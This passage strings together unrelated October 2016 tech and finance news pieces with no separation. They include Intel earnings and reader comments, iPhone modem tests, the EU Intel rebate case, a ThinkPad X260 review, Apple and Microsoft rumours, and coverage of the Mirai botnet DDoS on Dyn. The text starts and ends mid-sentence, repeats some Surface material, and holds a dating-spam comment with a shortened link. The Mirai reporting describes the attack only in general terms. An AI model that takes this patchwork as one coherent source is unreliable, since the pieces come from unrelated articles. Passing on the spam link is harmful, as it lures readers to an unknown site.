billion, plus or minus $500 million, and margins of 61%. Intel has continued to diversify its portfolio, and has been building out other divisions to assist with growth while the PC market continues to decline, and while the Client Computing Group continues to be their largest division, they have had strong growth in other areas like the Data Center Group which had record revenue this quarter, and IoT which continues to grow quickly.

POST A COMMENT 6 Comments View All Comments twotwotwo - Friday, October 21, 2016 - link I bet one can make decent guesses at all of these things with enough research, but there are a lot of more granular things that the topline numbers make me wonder. Who's paying Intel a half a billion dollars a quarter for Internet of Things things? How do volume and margins for datacenter stuff break down into the handful of big cloud customers vs. everyone else? Likewise for Apple's client purchases vs. the rest of the client market. None of that is to fuss with success, just interesting if you're trying to figure out how the larger trends out there will affect Intel and what they might look like in a few years. Reply dealcorn - Friday, October 21, 2016 - link I believe Intel's IoT group includes retail, factory automation and transportation such as in vehicle or drones. Wearables are not a strength. Many/most big purchasers have workloads where Intel is able to enhances value through customized solutions. Customized solutions that enhance value are typically higher margin. Reply witeken - Friday, October 21, 2016 - link If you are -- like me -- honestly interested in those things, reading Intel's earnings reports can be a good place to start, although the topics are very investor focused. So the best thing would actually be to watch their yearly Investor Meeting presentations, which go in more depth about some of their businesses. They are held every November and this one's from last year: http://intelstudios.edgesuite.net/im/2015/start.ht... That's about the deepest you can go. Another indicator by the way are acquisitions. Reply witeken - Friday, October 21, 2016 - link The reason data center ASPs declined is actually because Intel in the last few years has been gaining a lot of momentum in the network market. They had a share of 10% in that market in 2015, but this year the big players have started moving from proprietary stuff (I thought ASICs) to Intel architecture because of the advantages -- you can understand that that is process that takes many years. However, those guys don't buy heavy E5s, but they tend to buy the cheaper stuff. So for Intel this is maybe a $10B market that they are currently just a small player in, but they have consistently grown their MSS in the last few years from 5 to 7 to 10% from 2013-2015. So this is a separate market for their data center business which causes volume to go up but ASP down. This is actually the opposite of what happens in the rest of the data center, certainly in the 30% growing cloud market, that they tend to move up the stack because of TCO -- total cost of ownership. Just saying. Reply Annabella24 - Wednesday, October 26, 2016 - link Are you single tonight? A lot of beautiful girls waiting for you to https://goo.gl/PSgNLj Reply milkywayer - Sunday, October 30, 2016 - link I guess part of the extra earnings is thanks to the 30-50% increased prices on consumer CPUs.

Prior to this, Apple had pretty much used Qualcomm’s modems exclusively. When it was discovered that Intel’s modems are being used, we also wondered how this might impact performance. Turns out there is some difference. According to some tests that have been conducted, it was discovered that Qualcomm’s modems appear to have better reception in places where the signal is fainter. This means that if you’re inside a building or underground, the tests seem to suggest that the Qualcomm model will provide you with better service than the Intel model. The disparity in performance was not just limited to the iPhone 7. Cellular Insights, who performed the test, brought in other phones as comparisons which included the iPhone 6s, LG G5, Google Nexus 5X, and Samsung Galaxy S7 Edge. It seems that the Intel iPhone 7 got left in the dust while the Samsung Galaxy S7 Edge proved to be the clear winner. Now whether or not this will affect your daily usage remains to be seen. So far there doesn’t appear to be too many complaints regarding reception (there were issues with reception but those were addressed with software fixes), meaning that maybe in real-world usage the disparity can’t be felt as much. It also reminds us of the time the iPhone 6s was discovered to have chipsets made by Samsung and TSMC, with the latter proving to have better battery life than the former, although like we said then, those were merely tests and real-world usage is probably what really matters.

The Commission had found that Intel gave hidden rebates to computer makers including Dell and Hewlett-Packard on condition that they bought all, or almost all, of their main processors from Intel. Intel also made direct payments to Europe's largest PC retailer - Media Saturn Holdings - on condition that it stocked only computers with Intel processors. The chipmaker, which employs about 4,500 people in Ireland, also made payments to some computer makers to stop or delay the launch of products containing a rival's processors. But yesterday, an Advocate General for the European Court of Justice - Nils Wahl - said that the General Court failed to establish that the rebates and payments offered by Intel were anti-competitive and that certain deals between the firm and PC maker Lenovo harmed European consumers. These were key elements of the Commission's 2009 decision. The opinion from Mr Wahl - who has said a judicial review of the EC decision is needed - isn't binding, but the advice of Advocate Generals is typically adopted by the court. His opinion is a setback for the European Commission, which has prided itself on taking on giant corporations. The opinion delivered yesterday comes as Ireland prepares to launch its appeal against the European Commission's ruling this year that tech giant Apple must pay Ireland €13bn in back taxes for allegedly benefiting from a sweetheart deal here. The Government and Apple have denied that such a deal ever existed. In 2014, Intel's first appeal in its case was rejected by the Court of Justice. The Commission said that decision it justified its pursuit of Intel's anti-competitive conduct. In its latest appeal, Intel argued that the Commission had failed to analyse "all relevant circumstances" to determine if the rebates did in fact result in rivals being squeezed out. Mr Wahl's opinion is a good omen for companies seeking guidance on what kind of rebates should be considered harmful, said Ian Giles, a partner at London-based Norton Rose Fulbright. US chipmaker Qualcomm is fighting EU charges of using anti-competitive methods, including giving rebates.

And according to a new report, the latter version offers better cellular performance than the former. Cellular Insights compared two different iPhone 7 Plus models, one with an Intel XMM7360 modem and one with a Qualcomm MDM9645M modem. The tests were conducted with signal testing equipment on LTE bands 4, 7, and 12, and the phones were compared at different signal strengths. According to this report, both the Intel modem and Qualcomm modem performed similarly when they had a strong signal. However, as the signal got weaker, cellular performance of the Intel modem dropped off much farther than the Qualcomm modem. On LTE band 4 at -110dBm, the Intel modem put up speeds of around 60Mbps, while the Qualcomm modem was putting up speeds of 100Mbps. The story was similar with LTE band 12 performance, the Intel modem saw speeds of around 36Mbps at -110dBm, while the Qualcomm model put up speeds of around 64Mbps. According to this report, the average performance difference between the two modems was around 30 percent. “In all tests, the iPhone 7 Plus with the Qualcomm modem had a significant performance edge over the iPhone 7 Plus with the Intel modem,” explains Cellular Insights. The iPhone 7 with the Intel modem is the model for AT&T and T-Mobile, while the iPhone 7 with the Qualcomm modem is the version for Sprint and Verizon. Qualcomm’s modem is also in the SIM-free iPhone that Apple sells on its website. Apple hasn’t revealed why it’s using Intel modems in some iPhone 7 models and Qualcomm modems in others. Judging by the results of today’s report, though, it’s the Qualcomm modem that you want to get if you’re buying a new iPhone 7 or iPhone 7 Plus. That means that Sprint and Verizon customers are good to go, but if you’re on AT&T or T-Mobile and want a device with a Qualcomm modem, you’ll need to buy SIM-free from Apple.

Intel Turbo Boost Max 3.0 Patches Updated For Linux 4.9 Written by Michael Larabel in Intel on 20 October 2016 at 07:39 PM EDT. 4 Comments Intel has updated its currently out-of-tree Turbo Boost Max Technology 3.0 patches for compatibility against the Linux 4.9-rc1 kernel plus made other improvements to the code. These patches have been worked on the past few months after Intel PR initially claimed no TBM 3.0 Linux support. The patches have gone through several public revisions but sadly didn't make it for integration into the mainline Linux 4.9 kernel. But the V6 patches are now out with support for 4.9-rc1 plus making other improvements for supporting this performance-boosting technology found on newer CPUs such as the Broadwell-E Core i7 6800K. I'll be trying these latest patches against Linux 4.9 on my i7-6800K shortly for seeing how it affects the performance. Hopefully these patches will be mainlined for Linux 4.10. 4 Comments Tweet About The Author Michael Larabel is the principal author of Phoronix.com and founded the site in 2004 with a focus on enriching the Linux hardware experience.

Fine performance for category. Partially rugged design. Cons Display is a bit small. A little bulky for an ultraportable. No USB-C port. Fairly short warranty. Bottom Line A dual-battery design for record-breaking battery life, a comfortable keyboard, and a good price combine to make the Lenovo ThinkPad X260 one of the most compelling business ultraportables you can buy. By Matthew Murray Lenovo is not much of a chance-taker when it comes to business laptops; the company knows what its customers want, and is generally happy to provide it with a minimum of filigree. That does not, however, mean that they don't maximize every single element of those machines. Case in point: the ThinkPad X260 (starts at $849; $1,344 as tested). Inside and out, it looks like a typical, unremarkable Lenovo ultraportable, marching nearly in lockstep with its predecessors, the ThinkPad X250 and the ThinkPad X240. But a few subtle changes make a big difference for professional customers with specific needs, and in turn deem the ThinkPad X260 one of the best laptops of its type. //Compare Similar Products Compare Asus ZenBook 3 (UX390UA)   %displayPrice%%seller% see it Apple MacBook Air 13-Inch (2015)   %displayPrice%%seller% see it Apple MacBook (2016)   %displayPrice%%seller% see it Lenovo ThinkPad X1 Carbon (4th Gen, 2016)   %displayPrice%%seller% see it New Razer Blade Stealth (Late 2016)   %displayPrice%%seller% see it Dell XPS 13 Touch (2016)   %displayPrice%%seller% see it Apple MacBook Pro 13-inch (Retina Display)   %displayPrice%%seller% see it Lenovo IdeaPad 100S-11 (80R2003XUS)   %displayPrice%%seller% see it Lenovo ThinkPad Yoga 260   %displayPrice%%seller% see it HP EliteBook Folio G1 (1080p HD)   %displayPrice%%seller% see it Dell Latitude 13 7000 (7370)   %displayPrice%%seller% see it Design and Features Although the ThinkPad X260 technically meets our definition of ultraportable, it's far from the thinnest and lightest laptop you can find. Measuring 0.8 by 12.03 by 8.21 inches (HWD) and weighing 3.03 pounds, it's far thicker than, say, the Asus ZenBook 3 (UX390UA), the New Razer Blade Stealth, the Apple MacBook Air, or even Lenovo's own ThinkPad X1 Carbon. And though it's not heavy, it's a shade too substantial to be the kind of thing you toss in your briefcase and forget about. But if you do throw in there (or pretty much anywhere else), it will have some degree of protection, as it's MIL-SPEC certified for ruggedness, with particular guard against hazards like temperature, humidity, dust, and more. View All 7 Photos in Gallery One additional benefit of its size comes in terms of the port selection, which is on the generous side for laptops of this type these days. On the left edge are the power jack, an HDMI port (replacing the VGA port that was still in place on last year's ThinkPad X250), a Mini DisplayPort connector, and two USB 3.0 ports (note that they're colored black, rather than the blue that usually denotes this faster standard). A security lock slot, an Ethernet port and an SD card slot (neither of which you'll find on the ThinkPad X1 Carbon), a third USB 3.0 port (with fast charging capability), and a headset jack are on the right; if you select the optional wireless modem at checkout time, the slot for that is there, too. The one major port missing: USB-C, which you'll find on many ultrathin laptops and would definitely give the X260 a next-generation boost of connectivity. The rest of the design is standard Lenovo stuff, with form following well behind function; the X260's design is almost identical to that of the X250, the biggest outward change being the shift to the newer, more contemporary Lenovo logo in the display's lower-left corner. As a whole, the X260 is quite squarish, and just about everything is black, the exceptions being the silver ThinkPad logos on the lid and the keyboard deck, the red dot over the "i" in those logos (the one on the cover lights up), the white key labels, the green light on the Power button in the upper-right corner of the keyboard deck when the laptop is turned on, a hint of red lining on the touchpad's buttons, and the de rigueur crimson TrackPoint stick located in the center of the keyboard. Even so, nothing stands out or distracts you from your work, which is likely the intent. The keyboard is one fervent typists will appreciate, with glossy, slightly rounded keys that have an excellent amount of travel. (It doesn't have dedicated media keys, and the function key row is half-height at most, but these will hardly impediments for most business users.) The touchpad is smooth but not overly slick, and its buttons (rectangular left- click and right-click, and the trapezoidal scroll button between them) are firm without being stiff or sticky. A fingerprint reader, good for making use of the Windows Hello functionality in the Windows 10 Pro operating system, is on the bottom right of the keyboard deck. Like the ThinkPad X1 Carbon, the ThinkPad X260 has a 12.5-inch antiglare display with In-Plane Switching technology for colors pop and wider viewing angles; unlike it, the X260's display has a resolution of 1,920 by 1,080 rather than 2,560 by 1,440. It looks terrific, regardless: bright and crisp, though the fairly wide bezel (about 0.75 inch on the top and 0.6 inch on the sides) makes the screen, which is already not huge, look even smaller. (Perhaps realizing this, Lenovo ships the X260 with 125-percent magnification enabled in Windows.) A 720p webcam may be found in the top bezel. The speakers put out a decent amount of volume, though their bass response is on the anemic side. As tends to be the case with Lenovo laptops, you have a lot of configuration options with the ThinkPad X260. For many users, a collection similar to that of our review unit will be sufficient: a 2.4GHz Intel Core i5-6300U processor (with integrated Intel HD Graphics 520), 8GB of RAM, and a 256GB solid-state drive (SSD). Wireless connectivity comes by way of 802.11ac Wi-Fi and Bluetooth. Lenovo covers the X260 with a one-year service warranty, which is on the light side for a business laptop. Performance In our tests, the ThinkPad X260 proved a deft, if not spectacular, performer at productivity-oriented tasks. Its scores of 2,995 on our general-purpose PCMark 8 Work Conventional test and 313 on our CineBench rendering test, and its times of 2 minutes, 21 seconds, to finish our HandBrake video encoding trial and 4:35 to apply a large number of filters to an image in Photoshop, placed it ahead of most of its competitors. It came out ahead of the 2016 Apple MacBook across the board; except at PCMark, ahead of the 1080p HP EliteBook Folio G1; and, except at Photoshop, ahead of the ThinkPad X1 Carbon. See How We Test Laptops For the record, the ThinkPad X260 completed our Photoshop test quicker than the just-released Kaby Lake–based ZenBook 3, but it didn't surpass the Razer Blade Stealth or HP Spectre x360 13-w023dx at anything. Intel's new processors are formidable components you'll want to consider for business applications once they become more widely available, but the ThinkPad X260 is still well equipped. Note, though, you shouldn't try to sneak in much 3D gaming on the ThinkPad X260. It should be able to survive basic casual titles, but unless you're willing to turn the resolution and the details way down, you're not going to see good frame rates from the integrated Intel graphics system, as our gaming tests proved. Stick with work. The good news? You'll be able to work really a long time on the ThinkPad X260. (Okay, maybe that's not good news.) Either way you look at it, battery life is outstanding. Though this is in part because it pairs a sealed interior battery with a removable, hot-swappable external one, what matters in this case are the numbers: It lasted 10 hours, 45 minutes on our rundown test with its default 24Wh battery installed. And when you swap that battery for the 72Wh replacement cell (included with our review unit, but only another $15 at checkout), its uptime leaps to a breathtaking 23:08—over 6 hours more than we saw with our reigning champ, the 13-inch MacBook Air. The downside of this is that the 72Wh battery is noticeably larger, and adds about a half-inch to the laptop's height when installed. (It only adds 0.38 pound to the weight.) But if you need the extra time, it's worth this minor annoyance. Conclusions If you want a truly eye-popping ultraportable, you can find it in releases like the Asus ZenBook 3 or the Apple MacBook, but those machines require you to make some sacrifices in terms of usability, configurability, and durability that are not ideal for a business environment. For business, a sterling screen and a comfortable keyboard are musts, of course, and, like the ThinkPad X1 Carbon and the HP EliteBook Folio G1, this laptop has them. And its removable battery can result in legitimately astounding uptime. Yes, you have to forego the Carbon's higher-resolution screen and the EliteBook Folio's shinier looks, but the other trade-offs and the money you save (about $200 for the Lenovo, $120 for the HP) cushion that blow. So much so, in fact, that the ThinkPad X260 is our latest Editors' Choice for business ultraportables. Back to top PCMag may earn affiliate commissions from the shopping links included on this page.

In line with long-standing rumors, Kuo believes the highlight of the event will be a redesigned MacBook Pro in both 13-inch and 15-inch sizes, adopting an OLED touch bar and Touch ID sensor, USB-C, Thunderbolt 3, and the same butterfly keyboard design introduced on the MacBook in 2015. Kuo also adds several new tidbits to the rumor mix: Our new predictions also include: (1) Intel’s (US) Skylake processor; (2) the same panel resolution but better display quality and energy efficiency thanks to an oxide panel; (3) a new option of 2TB SSD storage capacity; (4) adoption of a similar processor as Apple Watch to control the OLED touch bar more energy-efficiently in the new MacBook Pro models; and (5) a Type-C & MagSafe-like adapter rolled out by Apple or a third-party supplier, given positive reviews for the MagSafe charging design.Beyond the MacBook Pro, Kuo says Apple will also be introducing a "13-inch MacBook," a claim he has shared previously. Rather than being a slightly larger version of the current 12-inch MacBook, however, this is likely to be a MacBook Air, which would align with other rumors claiming that only the 13-inch MacBook Air will be seeing an update with new USB-C ports. On the desktop side, rumors have indicated that Apple is working on updated iMac models with discrete AMD graphics options, as well as a new standalone external 5K display, but Kuo says those products will not be ready until the first half of next year. It is still possible, however, that Apple could announce them at next week's event. We also expect Apple to launch new iMacs (21.5-inch and 27-inch) and Cinema Display (27-inch) in mid- 1H17. We cannot say for certain whether Apple will announce the new iMacs and Cinema Display on October 27 as the shipping schedule is not imminent.Apple's event is being held at the company's Cupertino campus and kicks off at 10:00 AM Pacific Time on Thursday. MacRumors will have full coverage both here on the site and on our @MacRumorsLive Twitter account, and Apple will be offering a live video stream of the event.

The event which held recently in Ikeja, Lagos, featured an idea pitching competition involving five young business enterprises with Greenville Organic Foods, an agro-allied company emerging the winner of a N4 million business solution from Microsoft . Addressing over 200 participants at the event tagged “Accelerate Your Business’’, Head, Emerging Businesses, Diamond Bank Plc, Njideka Esomeju stated that most Micro Small and Medium Enterprises (MSME) were saddled with the problem of Access to Finance, Access to Market and Access to skills, pointing out that 80% of over 35 million business ventures in Nigeria fall under the MSME category.  Njideka revealed that Diamond Bank was focused on going beyond banking to take people to the next level in life. In her words, “At Diamond Bank, we back our passion with action as we continually seek to deepen inclusive financing in all sectors across the country’’. Sharing her wealth of knowledge on small businesses with the attendants, she stated that most start-ups were designed with borrowed business plans and consequently wired to fail from the start.  Njideka reiterated that Diamond Bank had embraced the challenge of serving small and growing businesses by setting up a focused unit to drive MSME initiatives. “The Bank’s Emerging Business Propositions team recognises that finance is not the only need of small and growing businesses, which is why we have developed interventions that go beyond the traditional services offered by most banks.”  Our Capacity Building, Access to Markets and Access to Finance offerings are specifically designed to assist businesses realise their growth potential”, said Njideka.   She pointed out that the proposition comprised of special accounts for different vocations and practices ranging from schools to agriculture, entertainment and medical practice all tailored to suit industry needs. She also disclosed that the theme for the year at Diamond Bank was focused on the digital revolution and the Bank had designed revolutionary tools and platforms in line with this drive, adding,  “The Diamond Mobile app, Online Loan application platform and the Diamond E-susu scheme are some of the digital products created to give our customers the competitive edge”.  She urged the attendants to utilise the Bank’s SME club events where it partners with relevant industry stakeholders to organise events bringing together people within an industry to create value chain networking. Head, SME Customers’ Marketing, Microsoft Nigeria, Mr. Adeniyi Adebote , in his address said; MSME’s have to leverage technology to deepen consumption in their various industries. He further stated that Microsoft was driven to empower each individual to achieve more as reflected in Microsoft 365 which had been developed to narrow the generational gap and enable people to grow their businesses innovatively he said.

Compromised machines, following orders from as-yet unknown masterminds, threw massive amounts of junk traffic at servers operated by US-based Dyn, which provides DNS services for websites large and small. The result: big names including GitHub, Twitter, Reddit, Netflix, AirBnb and so on, were among hundreds of websites rendered inaccessible to millions of people around the world for several hours today. We're told about a hundred thousand gadgets using millions of IP addresses were press-ganged into shattering the internet. A lot of these commandeered gizmos were running the Mirai malware, the source code to which is now public so anyone can wield it against targets. Dyn tells us its services are coming back online after seeing out the storm and putting up new defenses. Here's what we know: Starting from 1110 UTC, a distributed denial-of-service attack knocked Dyn's DNS nameservers offline. This continued throughout the day in three independent waves as hackers targeted Dyn's data centers one by one, including its US East Coast facility. By 2037 UTC, the situation is said to be under control after mitigations were put in place to block ongoing attacks. Dyn is a crucial component in the internet's infrastructure because when you visit a website that uses Dyn's DNS servers, Dyn is supposed to help your browser or app find the right system to connect to. When Dyn does down, your software can't find the website you want to visit. A spokesperson for US Homeland Security said the agency is "investigating all potential causes" of the mega-outage. Dyn's chief strategy officer Kyle York told The Register by phone that devices behind tens of millions of IP addresses were attacking his company's data centers. A lot of this traffic – but not all – is coming from Internet-of-Things devices compromised by the Mirai botnet malware. This software nasty was used to blast the website of cyber-crime blogger Brian Krebs offline in September, and its source code and blueprints have leaked online. That means anyone can set up their own Mirai botnet and pummel systems with an army of hijacked boxes that flood networks with junk packets, drowning out legit traffic. One online tracker of Mirai suggests there at least 1.2m Mirai-infected devices on the internet, with at least 173,000 active in the past 24 hours. Mirai spreads across the web, growing its ranks of obeying zombies, by logging into devices using their default, factory-set passwords via Telnet and SSH. Because no one changes their passwords on their gizmos, Mirai can waltz in and take over routers, CCTV cameras, digital video recorders, and so on. York said the waves of attacks were separate and distinct – there are multiple bot armies out there now smashing systems offline. "We're expecting more," he added. Public DNS providers, such as Google and cable ISPs, that act as a go-between were also unable to reach Dyn's systems and were unable to resolve domain names for netizens. OpenDNS was the hero of the day, thanks to its smart caching of lookups: anyone having connectivity problems as a result of Dyn's outage should switch to using OpenDNS's public resolvers. Websites are moving away from Dyn to avoid any further downtime. Dyn has released some more details on the assault here. Infosec biz Flashpoint, which has been investigating the attacks with Dyn staffers, has shed more light on today's crippling assaults: Flashpoint has confirmed that some of the infrastructure responsible for the distributed denial-of-service (DDoS) attacks against Dyn DNS were botnets compromised by Mirai malware. Mirai botnets were previously used in DDoS attacks against security researcher Brian Krebs’ blog “Krebs On Security” and French internet service and hosting provider OVH. Mirai malware targets Internet of Things (IoT) devices like routers, digital video records (DVRs), and webcams/security cameras, enslaving vast numbers of these devices into a botnet, which is then used to conduct DDoS attacks. Flashpoint has confirmed that at least some of the devices used in the Dyn DNS attacks are DVRs, further matching the technical indicators and tactics, techniques, and procedures associated with previous known Mirai botnet attacks. While Flashpoint has confirmed that Mirai botnets were used in the October 21, 2016 attack against Dyn, they were separate and distinct botnets from those used to execute the DDoS attacks against “Krebs on Security” and OVH. Earlier this month, “Anna_Senpai,” the hacker operating the large Mirai botnet used in the Krebs DDoS, released Mira’s source code online. Since this release, copycat hackers have used the malware to created botnets of their own in order to launch DDoS attacks. It is unknown if the attacks against Dyn DNS are linked to the DDoS attacks against Krebs, OVH, or other previous attacks. Given the proliferation of the Mirai malware, the relationship between the ongoing Dyn DDoS attacks, previous attacks, and “Anna_Senpai” is unclear. As of 1730 EST, the attacks against Dyn DNS are still ongoing. Flashpoint is coordinating with multiple vendors and law enforcement to track the infected devices that constitute the botnet being used to conduct these attacks. Flashpoint will continue to monitor the situation to ensure that our clients are provided with timely threat intelligence data. Chris Sullivan, general manager of intelligence at Core Security, also gave us some insight into today's meltdown: This outage appears to have resulted from a new breed of very high volume DDoS, or denial-of-service attacks, that will be difficult to handle with the defenses that most enterprises have in place today. The really frightening part of this is not that we will be struggling with these new attacks for some time, but that the underlying weakness which makes them successful can and will be used to unleash more serious attacks that steal credit cards and weapons designs, manipulate processes like the SWIFT global funds transfers, and even destroy physical things the 30,000 PCs at Saudi Aramco. IoT devices are the very cheap computers that we use to control the heat, lights and baby monitor in your home or tell UPS when a truck needs service – some cost less than $1. Unlike your PC or your phone, IoT devices don’t have the memory and processing to be secured properly, so they are easily compromised by adversaries and it’s very difficult to detect when that happens. This is what’s driving the new ultra-high volume DDoS attacks like we saw today. Ultra-large IoT botnets are instructed to make so many superfluous requests of the target that legitimate requests cannot get through. No real damage is done but service is denied for legitimate users. Maybe you can’t get to twitter for an hour. But these same devices also have access to what we think are highly secured corporate, nations state and defense networks. They can be used to launch attacks on those networks from the inside where all of the net-generation firewalls, intrusion prevention and user based analytics tools won’t even see them. Companies should move immediately to get control of this situation both to protect themselves and because, in the wake of these new high profile events, it’s likely to be mandated by new law. What is required now is the deployment of systems that don’t try to control the IoT devices but rather watch and learn how they behave so that we can identify malicious activity and isolate them when necessary. El Reg has been banging about IoT security for ages: Mirai is now targeting cellular gateways. Not enough is being done to patch insecure gadgets. Do gizmos need some sort of security-warning labels? The blame here is not with Dyn. It is not even with the owners of the hijacked devices. It lies with the botnet operators – and, perhaps more crucially, the dimwit IoT manufacturers who crank out criminally insecure hardware that can be compromised en masse. Particularly China-based XiongMai Technologies, which produces vulnerable software and hardware used in easily hijacked IP cameras, digital video recorders and network-attached video recorders. These crappy devices were at the core of today's attacks, according to Flashpoint. Until there is a standards crackdown, and vulnerable devices are pulled offline, this will continue on and on until there is no internet left. ® Sponsored: The state of mobile security maturity Tips and corrections 222 Comments More from The Register Dyn dinged by DDoS: US DNS firm gives web a bad hair day Reddit, Github, Airbnb and pals affected 31 Comments A successor to Mirai?

The Best Acquisition We've Seen In 2016 (Seeking Alpha) The “best is yet to come” from Microsoft Corporation (NASDAQ: MSFT), Wunderlich said as part of its upgrading the stock to Buy from Hold after the company’s first quarter revenue and EPS topped the Street on growth in Azure and adoption of Office 365. “We believe the upcoming quarter to be an inflection point for MSFT as the company will complete the sale of its feature phone business and the acquisition of LinkedIn, signifying the end of the old and the beginning of the new,” analyst Ryan MacDonald wrote in a note. MacDonald believes the integration of LinkedIn Corp (NYSE: LNKD) will boost the value proposition of Azure, Office 365 and Dynamics. Related Link: Microsoft On The Brink Of Inflection Point In Cloud Services Looking ahead, the company guided second-quarter revenue to a range of $24.65 billion–$25.45 billion, below consensus at $25.8 billion. This guidance includes a 100bps FX headwind. Commercial unearned revenue is expected to be in the range of $21.05 billion - $21.25 billion. Meanwhile, the analyst cut his FY17 revenue estimate to $93.893 billion from $94.462 billion, but raised FY17 EPS estimate to $3.06 from $2.94. Shares of Microsoft currently trade at a P/E of 18.7x his FY17 estimate of $3.06, a discount to the large-cap software group mean of 23.4x. The analyst also raised the price target on the stock by $10 to $70, which assumes shares trade at 22.9x, a discount to the peer group multiple. “As such, we believe the best is yet to come as we expect revenue growth acceleration and margin expansion based on improving profitability metrics for commercial cloud,” MacDonald added. At the time of writing, shares of Microsoft rose 4.92 percent to $60.07. Full ratings data available on Benzinga Pro. Do you have ideas for articles/interviews you'd like to see more of on Benzinga?

Regulators now speak of sandboxes and national charters for fintech companies, and some of the young guns on the scene are starting to add more features to their products. Now, a large fintech lender is getting recognition for the quality of its loan securities. CommonBond, a fintech lender that uses data technology to lower the costs of student loans, today announced a $168 million securitization of student loan debt backed by $178 million in collateral. The package received an A1 rating from Moody's Investors Service. Barclays PLC (ADR) (NYSE: BCS) and Goldman Sachs Group Inc (NYSE: GS) ran the books and jointly managed the account for the transaction. Related Link: The Startup That Wants To Bring Expert Networks To Every Investor "CommonBond has built a sterling reputation in the capital markets due to our meticulous, data-driven underwriting," said Morgan Edwards, CommonBond's chief financial officer, in a press release. "We continue to be excited to see new investors participate with each transaction we bring to the market and expect to see the diversity of investors increase with subsequent deals." The securitization is the company's third, following a $150 million package in April of this year and a $100 million offering last June. "This securitization represents a progression in the sophistication in our capital markets team and CommonBond as a whole," said Phil DeGisi, CommonBond's chief marketing officer, in an interview with Benzinga. "We're excited that the strength of our underwriting is being recognized by some of the most respected ratings agencies in the country." The company's first securitization was the first time Moody's had ever given an investment-grade rating to an inaugural marketplace issuer, DeGisi added. CommonBond announced the closing of $300 million in fundraising in July, as well as the acquisition of Gradible, a company that offers insights on how to manage student loan debt. The company is backed by investors including Vikram Pandit, former Citi chief, and Tom Glocer, former CEO of Thomson Reuters. Full ratings data available on Benzinga Pro.

Now, Microsoft hopes it can do the same for desktop PCs. The firm is rumoured to be putting the finishing touches to an all in one desktop PC - and new patent drawings appear to reveal the machine Microsoft will unveil in New York on the 26th October. Scroll down for video  The patent designs show an iMac-like machine, with a screen testing on two arms According to Mary Jo Folet at ZDnet, the new device is codenamed Cardinal, and will come in three sizes - with a 21, 24 ,or 27 inch screen.  'I've heard that Surface Cardinal could be positioned as a product that can turn your desk into 'a studio',' she wrote. The device is expected to be unveiled at an also rumoured late October event where the firm's tablets could also get an upgrade. According to Windows Central, it will have a 'modern and elegant' design. RELATED ARTICLES Previous 1 Next Think you're more tech-savvy than your gran? Think again:...

Microsoft also recently revealed it will launch a mixed reality version of Windows next year. The move will bring a 3D holographic version of the platform to Windows 10 users who own a virtual reality headset. Announcing its plans at the Intel Developer Forum in San Francisco yesterday, Microsoft said user interface will be available to run on mainstream PCs.  Lenovo already makes a 27inch tablet/PC hybrid, called to Yoga 900 HOW WILL IT WORK?  According to Microsoft, the Holographic shell UI for Windows 10 will enable users to put on a headset to navigate their Windows desktop. It will mix 2D apps such as email and calendars - which could be overlaid onto surfaces with augmented reality - with fully immersive 3D apps, such as a virtual reality tour of a location. The exact look and feel will be dependent on the headset used - where an Oculus Rift style VR headset being fully immersive, while a Holoens style headset enabling AR and mixed reality. Users will be able to select applications using a point and click selector, like a Wii controller.  The new Holographic shell desktop UI will enable users to run Windows 10 through a VR headset hooked up to a standard PC, opening up the experience beyond those with high end gaming machines.  Writing in a blog post, Microsoft's executive vice president for Windows, Terry Myerson, said: 'Next year, we will be releasing an update to Windows 10, which will enable mainstream PCs to run the Windows Holographic shell and associated mixed reality and universal Windows applications. 'The Windows Holographic shell enables an entirely new experience for multi-tasking in mixed reality, blending 2D and 3D apps at the same time, while supporting a broad range of 6 degrees of freedom devices.' Microsoft is working with chip-maker Intel on a specification for mixed reality PCs and head mounted displays, in an effort to open up the market and its platform. The device is expected to be unveiled at an also rumoured late October event where the firm's tablets could also get an upgrade.

According to ZDnet, it will come in three screen sizes, 21, 24 ,or 27 inch and will have a 'modern and elegant' design. 'Our shared goal is to enable our hardware partners to build a broad range of devices for the mainstream consumer and business markets,' wrote Myerson. A promotional video demonstrates how the interface will look, running at 90 frames per second, triple that of most HD televisions. It shows a woman wearing a headset in a virtual room running a mix of 2D and 3D apps as she checks email, books flights, navigates a diary and takes a virtual tour of the Pantheon in Rome. The virtual dog in Windows holographic shell UI bears a close resemblance to Rover, the assistant character which made appearances in earlier Microsoft software Veteran Windows users will also notice the similarity between the virtual dog and Rover, an assistant character in Microsoft's less than successful Bob software and who later made an appearance in Windows XP. According to Microsoft, using a 'six degrees of freedom' headset, the interface can be manipulated using a point and click Wii-type controller. The headset in the video is unbranded (still pictured) but it could well be the Washington tech giant's mixed reality Hololens, or Facebook's Oculus Rift The headset in the video is unbranded but it could well be the Washington tech giant's mixed reality Hololens, or Facebook's Oculus Rift – which is set to launch in the UK next month – and which runs on Windows 10 devices.  While Hololens began shipping to developers in March at $3,000 a piece, but it remains unclear when a consumer version of the headsets could launch.

The Pros of Investing in the Technology Sector U.S. News & World Report - Money 10/21/2016 Leslie Thompson © (Getty Images) Millennials will make a big impact on tech stocks. Technology has been the clear standout sector within the Standard & Poor's 500 index. The sector returned 12.4 percent for the third quarter and some of the largest names – like Apple (AAPL), Microsoft Corp. (MSFT), Intel Corp. (INTC), Cisco Systems (CSCO) and Facebook (FB) – reported positive second-quarter earnings results. Popular Searches Audi AG AUDVF ▼ 656.20 -11.30 -1.69% Dick's Sporting Goods Inc DKS ▼ 56.71 -4.18 -6.86% International Business Machines Corp IBM ▲ 158.67 +0.46 +0.29% LGL Group Inc LGL ▲ 4.49 +0.18 +4.28% There is reason to believe that positive results will continue. August data published by the Bureau of Economic Analysis shows record high consumer spending in technology-related categories – at 4.1 percent year-over-year growth, this is the fastest growth since the first quarter of 2010. A standout has been computer spending growth – the 7.4 percent year-over-year growth in personal computers and peripheral equipment is the best growth since fourth quarter of 2011 and represents 26 percent of total consumer technology spending. Consumer spending on software also accounted for 23 percent and grew 2.5 percent year-over-year. Broadly speaking, technology remains attractive with its strong cash position and lack of sensitivity to rising oil prices and interest rates. In fact, rising interest rates could increase interest earnings for cash-rich companies, such as Apple. Over the next three to five years, global consumers will likely adopt faster 5G wireless technologies and significantly faster wireline technology, such as optical fiber to the home. [See: 9 Blue-Chip Powerhouse ETFs to Buy.] Millennials will make an impact, too. Many couples in this demographic will purchase single-family homes, like previous generations before them, and purchase their first TV or upgrade their current TV to a larger 4K screen. Furthermore, newly constructed homes will likely be equipped with the latest internet of things technology to monitor appliances, activate a home security system and to minimize energy consumption. Likely beneficiaries of these trends include semiconductor company Broadcom Limited (AVGO) and technology retailer Best Buy Co. (BBY). Following the combination of Avago and Broadcom, the new 